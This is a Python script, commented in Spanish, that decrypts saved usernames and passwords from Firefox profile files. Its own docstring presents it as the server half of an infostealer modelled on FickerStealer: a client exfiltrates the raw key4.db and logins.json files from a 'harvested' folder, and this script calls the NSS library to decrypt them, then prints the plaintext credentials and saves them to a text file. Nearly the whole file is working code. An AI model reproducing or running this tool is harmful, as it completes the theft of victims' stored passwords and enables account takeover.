#!/usr/bin/env python3
"""
Firefox Password Decryptor - Server-side NSS Decrypt
Basado en FickerStealer approach: Client exfiltra archivos RAW, server descifra

Requiere:
- key4.db (contiene master key cifrada)
- logins.json (contiene credenciales cifradas)
- NSS library (nss3.dll en Windows, libnss3.so en Linux)

Instalación NSS en Windows:
    choco install nss
    
Instalación NSS en Linux:
    sudo apt-get install libnss3

Uso:
    python firefox_decrypt.py <profile_directory>
    python firefox_decrypt.py C:/Temp/harvested/firefox/vdc6byky.default-release/
"""

import os
import sys
import json
import base64
import ctypes
from pathlib import Path
from ctypes import *

# NSS Library Loading
try:
    if sys.platform == 'win32':
        # Windows: buscar nss3.dll
        nss_paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
            r"C:\ProgramData\chocolatey\lib\nss\tools\nss3.dll",
        ]
        nss_lib = None
        for path in nss_paths:
            if os.path.exists(path):
                nss_lib = ctypes.CDLL(path)
                print(f"[+] NSS library loaded from: {path}")
                break
        
        if not nss_lib:
            raise FileNotFoundError("nss3.dll not found. Install Firefox or NSS library.")
    else:
        # Linux/Mac
        nss_lib = ctypes.CDLL("libnss3.so")
        print("[+] NSS library loaded: libnss3.so")
except Exception as e:
    print(f"[!] ERROR: Cannot load NSS library: {e}")
    print("Install Firefox or NSS library first")
    sys.exit(1)


# NSS Structures
class SECItem(Structure):
    _fields_ = [
        ('type', c_int),
        ('data', c_void_p),
        ('len', c_int)
    ]


# NSS Functions
NSS_Init = nss_lib.NSS_Init
NSS_Init.argtypes = [c_char_p]
NSS_Init.restype = c_int

PK11SDR_Decrypt = nss_lib.PK11SDR_Decrypt
PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
PK11SDR_Decrypt.restype = c_int

NSS_Shutdown = nss_lib.NSS_Shutdown
NSS_Shutdown.argtypes = []
NSS_Shutdown.restype = c_int


def decrypt_firefox_value(encrypted_value: str, profile_path: str) -> str:
    """
    Descifra un valor de Firefox usando NSS
    
    Args:
        encrypted_value: Valor cifrado en Base64
        profile_path: Ruta al perfil de Firefox (donde está key4.db)
    
    Returns:
        Valor descifrado
    """
    try:
        # Decodificar Base64
        encrypted_data = base64.b64decode(encrypted_value)
        
        # Inicializar NSS con el perfil
        if NSS_Init(profile_path.encode('utf-8')) != 0:
            raise Exception(f"NSS_Init failed for profile: {profile_path}")
        
        # Crear SECItem para datos cifrados
        encrypted_item = SECItem()
        encrypted_item.data = cast(c_char_p(encrypted_data), c_void_p)
        encrypted_item.len = len(encrypted_data)
        
        # Crear SECItem para resultado
        decrypted_item = SECItem()
        
        # Descifrar
        if PK11SDR_Decrypt(byref(encrypted_item), byref(decrypted_item), None) != 0:
            NSS_Shutdown()
            raise Exception("PK11SDR_Decrypt failed")
        
        # Extraer resultado
        decrypted_data = string_at(decrypted_item.data, decrypted_item.len)
        
        # Limpiar
        NSS_Shutdown()
        
        return decrypted_data.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return "[decrypt failed]"


def process_firefox_profile(profile_dir: str):
    """
    Procesa un perfil de Firefox exfiltrado
    
    Args:
        profile_dir: Directorio del perfil (contiene key4.db, logins.json)
    """
    profile_path = Path(profile_dir)
    
    # Verificar archivos necesarios
    key4_db = profile_path / "key4.db"
    logins_json = profile_path / "logins.json"
    
    if not key4_db.exists():
        print(f"[!] ERROR: key4.db not found in {profile_dir}")
        return
    
    if not logins_json.exists():
        print(f"[!] WARNING: logins.json not found, trying to find credentials...")
        # TODO: Buscar en otros archivos si es necesario
        return
    
    print(f"\n{'='*60}")
    print(f"[+] Processing Firefox Profile: {profile_path.name}")
    print(f"{'='*60}\n")
    
    # Leer logins.json
    with open(logins_json, 'r', encoding='utf-8') as f:
        logins_data = json.load(f)
    
    # Procesar credenciales
    credentials = []
    
    if 'logins' in logins_data:
        for login in logins_data['logins']:
            hostname = login.get('hostname', 'unknown')
            
            # Firefox antiguo: username/password en Base64
            username_plain = login.get('username')
            password_plain = login.get('password')
            
            # Firefox con Master Password: encryptedUsername/encryptedPassword
            username_enc = login.get('encryptedUsername')
            password_enc = login.get('encryptedPassword')
            
            # Procesar según formato
            if username_plain and password_plain:
                # Formato antiguo: solo Base64, no cifrado
                try:
                    username = base64.b64decode(username_plain).decode('utf-8', errors='ignore')
                    password = base64.b64decode(password_plain).decode('utf-8', errors='ignore')
                except:
                    username = username_plain
                    password = password_plain
            
            elif username_enc and password_enc:
                # Formato moderno: cifrado con NSS
                username = decrypt_firefox_value(username_enc, str(profile_path))
                password = decrypt_firefox_value(password_enc, str(profile_path))
            
            else:
                print(f"[!] Unknown format for {hostname}")
                continue
            
            credentials.append({
                'url': hostname,
                'username': username,
                'password': password
            })
    
    # Mostrar resultados
    print(f"\n[+] Found {len(credentials)} credentials:\n")
    
    for i, cred in enumerate(credentials, 1):
        print(f"[#{i}] {cred['url']}")
        print(f"    User: {cred['username']}")
        print(f"    Pass: {cred['password']}")
        print()
    
    # Guardar a archivo
    output_file = profile_path / "decrypted_passwords.txt"
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(f"Firefox Passwords - Decrypted\n")
        f.write(f"Profile: {profile_path.name}\n")
        f.write(f"{'='*60}\n\n")
        
        for i, cred in enumerate(credentials, 1):
            f.write(f"[#{i}] {cred['url']}\n")
            f.write(f"    Username: {cred['username']}\n")
            f.write(f"    Password: {cred['password']}\n\n")
    
    print(f"[+] Results saved to: {output_file}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python firefox_decrypt.py <profile_directory>")
        print("\nExample:")
        print("  python firefox_decrypt.py C:/Temp/harvested/firefox/vdc6byky.default-release/")
        sys.exit(1)
    
    profile_dir = sys.argv[1]
    
    if not os.path.isdir(profile_dir):
        print(f"[!] ERROR: Directory not found: {profile_dir}")
        sys.exit(1)
    
    process_firefox_profile(profile_dir)


if __name__ == "__main__":
    main()
